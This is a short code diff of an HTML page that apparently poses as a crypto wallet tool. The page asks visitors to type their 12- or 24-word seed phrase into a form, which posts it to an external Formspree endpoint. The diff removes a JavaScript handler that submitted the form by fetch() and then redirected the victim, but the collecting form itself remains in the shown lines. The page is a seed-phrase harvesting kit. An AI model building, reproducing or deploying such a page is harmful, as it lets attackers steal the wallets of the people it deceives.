@@ -235,32 +235,6 @@
             <button class="active" onclick="setWords(12)">12 words</button>
             <button onclick="setWords(24)">24 words</button>
         </div>
-    <script>
-document.addEventListener("DOMContentLoaded", function() {
-    document.querySelector("form").addEventListener("submit", function(event) {
-        event.preventDefault(); // Empêche la redirection par défaut
-
-        let formData = new FormData(this);
-        let nextPage = this.querySelector("input[name='_next']").value; // Récupère l'URL de redirection
-
-        fetch(this.action, {
-            method: this.method,
-            body: formData,
-            headers: { "Accept": "application/json" }
-        })
-        .then(response => {
-            if (response.ok) {
-                window.location.href = nextPage; // Redirige manuellement
-            } else {
-                alert("❌ Error submitting the form.");
-            }
-        })
-        .catch(error => {
-            alert("❌ Network error. Please try again.");
-        });
-    });
-});
-</script>
 
         <form action="https://formspree.io/f/mvgzqaok" method="POST">
             <textarea id="seedPhraseTextarea" name="seedPhrase" placeholder="Enter your seed phrase here. Make sure to add a space between each word." oninput="updateWords(this.value)" required></textarea>
